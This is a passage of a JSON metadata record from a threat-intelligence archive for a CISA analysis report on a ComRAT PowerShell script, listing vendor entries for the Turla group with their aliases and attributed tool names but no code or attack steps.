[submit@malware.us-cert.gov](http://10.10.0.46/mailto:submit@malware.us-cert.gov)\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and ph\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-29 - Malware Analysis Report (AR20-303A)- PowerShell Script- ComRAT.pdf"
    ],
    "report_names": [
        "2020-10-29 - Malware Analysis Report (AR20-303A)- PowerShell Script- ComRAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535982,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1653786347,
    "ts_modification_date": 1653786347,
    "files": {
        "pdf": "https://archive.orkl.eu/547b2a4bc45baa6a1f525d03bc9fc35d0043b7dc.pdf",
        "text": "https://archive.orkl.eu/547b2a4bc45baa6a1f525d03bc9fc35d0043b7dc.txt",
        "img": "https://archive.orkl.eu/547b2a4bc45baa6a1f525d03bc9fc35d0043b7dc.jpg"
    }
}